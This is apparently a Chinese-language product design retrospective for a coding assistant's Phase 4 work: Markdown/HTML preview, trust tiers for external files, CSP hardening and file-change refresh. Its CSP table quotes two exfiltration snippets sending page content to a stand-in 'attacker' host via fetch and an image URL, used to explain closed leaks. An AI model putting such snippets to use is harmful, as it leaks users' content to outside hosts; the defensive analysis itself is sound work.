# Phase 4 — Markdown 数据层 / Artifact 表现层 / 工程引用 — 产品思考

> 执行计划归档于 docs/exec-plans/completed/phase-4-markdown-artifact.md
> 前置批次的产品判断见 [markdown-artifact-overhaul.md](./markdown-artifact-overhaul.md)

这份文档回答"为什么这样做，而不是其他方式"。技术细节看 handover；本文只写思路。

---

## 用户痛点（项目起点）

前一轮 overhaul 把 Markdown / Artifact 预览体验做起来了，但它默认了几个隐含假设：
- 所有 Markdown 都在工作区里
- HTML 都是 srcDoc 渲染、不依赖外部资源
- AI 改完文件用户会主动手动刷新预览
- 想看 Markdown 的"漂亮样式"得弹窗生成一个 HTML 文件

这一轮的几条直接信号让这些假设站不住：

1. **外部 Markdown 用例越来越多** — 用户经常想打开非工作区下的 `.md`（其他项目的 README、Obsidian vault 里的笔记）；UI 路径硬卡 `baseDir` 直接返回 403。
2. **AI 写完文件预览不刷新** — assistant turn 改了 `.md`，预览面板还是旧内容；用户得关掉重开才能看到。这破坏了"Markdown 是事实源"的核心假设。
3. **HTML 预览看起来"坏掉了"** — AI 生成或用户打开的 HTML 引用 `./style.css` / `<img src="./logo.png">` / Tailwind CDN，全都加载失败，因为 srcDoc 模式下相对资源解析到 parent app URL。
4. **"生成展示版"流程过重** — Markdown 想看一个 Article 风格的渲染，要点按钮、弹窗确认、新建 inline-html tab；用户体感"切样式怎么这么费劲"。
5. **聊天里的工程引用是死文本** — `README.md:12` / `path/to/file.ts` / `localhost:3000` 出现在 AI 输出里只是 plain text，没法点开。

这些痛点合并指向一个产品判断：**Markdown 是数据层，HTML 是表现层，CodePilot UI 是把两层连起来的中介**。后续设计都跟着这条主线走。

---

## 核心设计决策

### 决策 1：Markdown 是数据层 / HTML 是表现层，物理分离

**场景：** 想让 Markdown 渲染得更好看（Article / Report / Brief / Pitch 风格），怎么做？

**备选：**
- (a) **写回 Markdown** — 在 `.md` 里塞 frontmatter style hint，或者干脆改成 HTML 文件
- (b) **派生 HTML** — Markdown 保持纯净，UI 派生出 HTML 供展示
- (c) **存配置** — workspace 里存"这个 .md 用什么风格预览"，下次打开同步

**选 (b)。理由：**
- Markdown 的核心价值是**长期可用、AI 可消费、可 diff、可版本控制**。任何把样式 / 结构混进 `.md` 的方案都会污染这些价值。
- (c) 看似干净，但"在哪存"立刻起争议：`.codepilot/` 里？workspace settings 里？跨设备同步？每条都引入新债。
- (b) 让 Markdown 永远是事实源，HTML 永远是衍生快照；衍生过程 100% 可重复（同样的 .md + 同样的 style 永远得到同样的 HTML），不需要持久化任何中间产物。

**落地形态：** PreviewPanel 头部 Style Select 直接切 CSS 类，渲染区内容不变；不弹窗、不新建 tab、不写盘。这是最轻的"派生"形态 — 派生到 DOM 而不是磁盘。

### 决策 2：Trust tier 三档，不是 binary

**场景：** "外部 Markdown" 这个能力到底要不要做？做了又怕 AI 输出的任意路径绕过授权读盘。

**备选：**
- (a) **不做** — 只允许 workspace 内
- (b) **做，二选一** — 内 vs 外，外的统一只读
- (c) **三档** — workspace / user-selected / agent-referenced

**选 (c)。理由：**
- 用户主动选的（文件选择器、最近文件、点了某个外部按钮）和 AI 提到的有本质区别：前者用户有过明确意图，后者没有。把两者归一类会让"AI 输出里出现 `/Users/me/.../secret.md`"等于"自动可读取"。
- agent-referenced 单独留位，**未确认前永不发 fetch**；用户必须显式点「只读打开」才升级 trust 到 user-selected。
- 这把"AI 提到不等于用户授权"做成代码 invariant，而不是文档约定。

**落地副作用：** Tab serialize 必须**替换**而不是合并 trust 字段，否则用户授权升级跨 session 不保留 — 又得重新确认。这条 invariant 在 `workspace-sidebar.ts` 的 `openDynamicTab` 里专门做了处理 + 单测。

### 决策 3：同源路由 + path-segment scope，不是 srcDoc 也不是 base 注入

**场景：** HTML 预览要解析相对资源（`./style.css` / `<img src="./logo.png">`），怎么做？

**备选：**
- (a) **`<base href="...">` 注入** — 往 HTML 里塞 base tag，让浏览器按某个 base 解析相对路径
- (b) **content 重写** — 服务端把 `./style.css` 改写成绝对 URL，再走 srcDoc
- (c) **同源路由 + path scope** — iframe `src=/api/files/html-preview/<scope>/<abs-path>`，浏览器原生相对解析自动保持 scope

**选 (c)。理由：**
- (a) 跟 HTML 自带的 `<base>` 冲突；URL 编码 + 嵌套路径有各种边缘 case，脆弱。
- (b) 要做 HTML AST 改写，引入解析复杂度；用户的脚本里如果动态构造 URL（`document.createElement('img').src = './logo.png'`），重写就漏掉。
- (c) 让**浏览器自己**做相对解析；服务端只需要在每个请求按 scope token 一次性 `assertRealPathInBase`。一处收口，零内容改写。

**Scope 装在 path segment 而不是 query：** query 不参与 browser-native relative resolution，scope 信息会丢；放进 segment 让 `./style.css` 自动产生 `/api/files/html-preview/<same-scope>/<sibling>` 的请求。

### 决策 4：CSP 两档分层 + Interactive 撤销所有 https 外联

**场景：** 既要让网页"能跑"（脚本、CDN 资源），又要防止预览内容被外发。

**演进路线：**

| 轮次 | 主要变化 | 漏洞 / 触发 |
|------|---------|-----------|
| Round 1 | 本地相对资源 OK；script 默认禁；CSP `default-src 'self' data: blob:` | 远端 CDN（Tailwind / Google Fonts）静默挡掉；用户感觉"预览又坏了" |
| Round 2 | CSP 拆 Static / Interactive；Static 放 `https:` 给 img/style/font/media；Interactive 额外 `script-src https:` | 未列出的 directive 都 fall through 到 `default-src`；脚本可以 `fetch('https://attacker', { body: outerHTML })` 把预览内容外发 |
| Round 3 | CSP 改 `default-src 'none'` + 每个允许方向显式列出；`connect/frame/object/worker/manifest-src 'none'` 两档都带 | 仍有 URL-shaped 通道：脚本可以 `new Image().src = 'https://attacker/?d=' + outerHTML` 把内容塞进 URL；这条走 img-src 的 https，不走 connect-src |
| Round 4 | Interactive 模式撤销 `script-src` / `img-src` / `style-src` / `font-src` / `media-src` 的所有 `https:`，只留 `'self' data: blob:` | 当前形态 |

**最终的产品语义：**

| 模式 | "脚本运行" | "外部 CDN 资源" |
|------|----------|----------------|
| Static | ❌ | ✅（作者写在 HTML 里的 https 资源） |
| Interactive | ✅ | ❌ |

**关键判断：** "让脚本运行"和"让脚本能访问 CDN"被切成**两个独立的信任决定**。用户开"启用脚本"就默认捎带"也开 CDN"是反安全直觉的；如果未来真有"我允许脚本也允许它访问 CDN"的场景，单独再加一个 UI 开关，不在「启用脚本」里默认捎带。

### 决策 5：file-changed 事件单通道 + 没有 watcher

**场景：** AI / 用户改了文件，预览要怎么知道？

**备选：**
- (a) **fs.watch / chokidar** — 后台监听文件系统
- (b) **轮询** — 预览面板定时 refetch
- (c) **事件单通道** — 所有写路径派发 `codepilot:file-changed`，预览订阅

**选 (c)。理由：**
- (a) 跨平台一致性差（macOS / Linux / Windows 表现不同）；symlink / 大目录 watcher 成本高。
- (b) 体验差 — 要么间隔短浪费资源，要么间隔长用户感觉"还没刷新"。
- (c) 因为**所有写路径都在 CodePilot 应用内**（要么是 `/api/files/write`，要么是 assistant tool），可以做到 100% 派发覆盖。代价是要维护写入工具白名单（MultiEdit 之类的高频遗漏点要补全）。

**关键 invariant：** `originId` 字段防自回声。autosave 自己派发的事件自己监听，本来会触发 refetch 自己刚写的内容 — 用 originId = 目标路径，监听端 skip 自己。

### 决策 6：Save-HTML 入口 deferred，helpers 保留

**场景：** Markdown 渲染好看了，要不要给用户一个"保存成 HTML 文件"按钮？

**两轮迭代后的判断：**
- 第一版加在 PreviewPanel 头部（用户两次直接反馈"为啥会有这个选项"）
- 第二版 Codex 又自动补上一遍

**决议：deferred，UI 入口不上**。理由：

1. **路径不对** — 设计是落到 `.codepilot/artifacts/<slug>.html`：隐藏目录 + slugified 文件名（`My Notes.md → my-notes.html`，丢了原名）。用户想把 HTML 分享出去，第一反应是在文件树里找 — 但隐藏目录看不见，slug 化又对不上号。如果真要做，得落在 `<同目录>/<原名>.html` 或显式的 `<workspace>/exports/`。
2. **头部塞不下** — 现有 5 个元素（filename · 路径 · Style Select · 编辑/预览 Tabs · Copy 按钮），用户已经反馈"下边距太近，加个按钮就更挤"。
3. **认知模型不清** — MD 是 source of truth，HTML 是衍生快照。用户改了 MD，磁盘 HTML 立刻过期 — 自动重写？手动 save？两种都有 UX 成本。**Style Select 已经让用户看到 HTML 形态**（in-place 切样式），"再保存一份"是单独的导出需求，不该是默认 Markdown header 的一部分。

**保留：** `buildPresentationArtifactPath` / `slugifyPresentationArtifactName` / `presentationStyleToTemplateId` 这三个 helper 作为脚手架留下，单元测试覆盖，零运行成本。等有真实用户场景（"我要把这份 MD 发给同事看"），设计统一的导出菜单（HTML / PDF / 长图），那时候直接接这套 helpers。

### 决策 7：文件预览卡片去 shadow + 单段 + 左右结构

**场景：** 聊天里 AI 修改文件后的预览入口卡片视觉怎么定？

**演进：**
- 第一版用 ai-elements `Artifact` 双段（gray top + white bottom + shadow）：信息量大，但视觉重，跟周围消息气泡风格不统一
- 第二版改成 design.md 的 strip card：单层 `rounded-lg + border-border/50 + bg-card`，左右结构（左：filename + Created/Modified pill + path；右：预览按钮）

**理由：** Artifact 双段的语义是"这是一个可以打开的复合容器"（标题区 + 内容区）；但聊天里的文件卡片**没有内容区**（点开才打开预览），双段就只是"两片颜色 + shadow"的装饰，没有信息密度。strip card 用单段 + 左右分工把"文件元信息 + 触发动作"压缩到一行，视觉重量降一个量级，跟消息气泡的密度对齐。

---

## 失败 / 回头路

### 弯路 1：以为"加 mode='static' + useLayoutEffect" 能修 Markdown refresh flicker

**现象：** Markdown 预览每次 quiet refresh 都看到一闪。

**误判路径：** 第一反应是 streamdown 的 `mode="streaming"` 触发了 re-mount；改成 `mode="static"`、再加 `useLayoutEffect` 同步 DOM 更新；都没修好。

**真因：** PreviewPanel 函数体里写了 `const Outer = ({ children }) => <div ...>{children}</div>`，每次 render 产生新组件 identity，React 把整个子树 unmount + remount。streamdown 是受害者，不是元凶。

**教训：** "X 库渲染闪烁"的归因很容易让人钻进库内部找选项；但 React 层面的反模式（inline component、key 不稳定、key 直接写 random）更常见。下次先排查"我有没有让 React 把整个子树重建"，再假设是渲染库的问题。

### 弯路 2：CSP 三轮才锁住外联

Round 1 → Round 4 的演进就是教训本身。每一轮的"漏洞"都不是上一轮的回归，而是上一轮漏了一类通道：
- Round 2 → 3：未列出 directive fall-through 到 default-src，等于默默放开
- Round 3 → 4：connect-src 关了不等于关上所有外联；img/style/script-src 的 https 也是 URL-shaped 通道

**教训：** CSP 设计要从「**显式列每条允许**」开始（`default-src 'none'` + 每个方向显式），不是从「**显式列每条禁止**」开始。后者总会漏。

### 弯路 3：Save-HTML 被加回两次

第一轮我自己实现，用户反馈"为啥有这个"；第二轮 Codex 把"补计划"理解成"补实现"又加上。两次都没有先做产品 review 就实现。

**教训：** 当一个能力被反复要求加回来，但用户的直接信号是反对的，先停下来做 product review，列清"路径错在哪、视觉成本、认知模型"。不要靠"我去掉再说"或"补上再说"做决策。

---

## 架构约束的副产品

### 约束 1：写入工具白名单是手动维护的

`MessageItem.tsx` 的 `WRITE_TOOLS` Set 必须人肉同步 SDK 新增的写入工具名。漏了 MultiEdit / NotebookEdit / write_file / create_file / str_replace_editor 任一，那条工具的改动不发刷新事件 → 预览呈现旧内容。

**为什么不动态？** SDK 没暴露"这条工具是不是写入"的元数据；猜需要 RegEx 之类的规则会有 false positive / negative。手动白名单 + 单元测试是当前最稳的方案。

### 约束 2：Tab metadata 替换而不是合并

`openDynamicTab(id, metadata)` 同 id 复用时必须**整体替换** metadata（含 trust），不是 spread merge。如果合并，trust 字段会从 `agent-referenced` 留着；用户授权升级 → reload 页面 → Tab 反序列化 → 又变回 `agent-referenced` → 又要重新确认。

这条 invariant 在前几版被反复踩过；现在 `workspace-sidebar.ts` 的 `openDynamicTab` 有单测专门盯它。

### 约束 3：worktree dev server 不能默认端口

主目录 dev server 已在 3000，worktree 必须 `PORT=3001` 启动避免冲突。这条在 worktree CLAUDE.md 里有规则；自动化测试入口要适配。

---

## 数字与验证

Phase 4 交付的量化指标：

| 维度 | 改动前 | 改动后 |
|------|--------|--------|
| Markdown 文件来源 | 仅 workspace 内 | workspace / user-selected / agent-referenced 三档 |
| HTML 相对资源 | srcDoc 解析失败 | 同源路由 + 浏览器原生解析 |
| HTML CSP 策略 | 单档 `default-src 'self' data: blob:` 兜底 | Static / Interactive 两档；`default-src 'none'` 起步 |
| Markdown 渲染样式 | 默认 minimal | Default / Article / Report / Brief / Pitch 五档；in-place CSS 切换 |
| AI 改文件 → 预览刷新 | 需要关闭重开 | quiet refresh + 冲突横幅 |
| 聊天里的工程引用 | plain text | path:line chip / diff Preview / localhost URL Browser / Artifact 双动作 |
| 单测覆盖 | overhaul 一批 1116 项 | Phase 4 后 2016 项 |

---

## 未来演进

不在本批范围、但和本批相关的方向：

1. **Export 菜单（HTML / PDF / 长图统一入口）** — 替代 deferred 的 Save-HTML 单点。设计入口可能在 Tab strip 的 overflow menu 或 Copy 按钮旁的 dropdown。
2. **全 vault 索引** — wikilink 当前是"显式提到才能跳"，没有反向链接图。如果做 vault 级别能力，重新评估文件夹索引器的成本。
3. **多文件 TSX 预览** — Sandpack 当前只支持单文件 React；多文件 / alias / CSS import 需要虚拟文件系统层。
4. **远端 sandbox 执行（E2B / Vercel Sandbox）** — 当前 HTML/JSX 仍本地、安全、显式授权。如果要支持 npm install / 多语言运行时，独立 Phase 评估。
5. **文件树右键菜单 rename / delete** — API 已全，UI 没接。需要 ContextMenu 原语。

这些都是独立产品决策，各自再走一遍"用户痛点 + 备选 + 选择 + 理由"的流程。
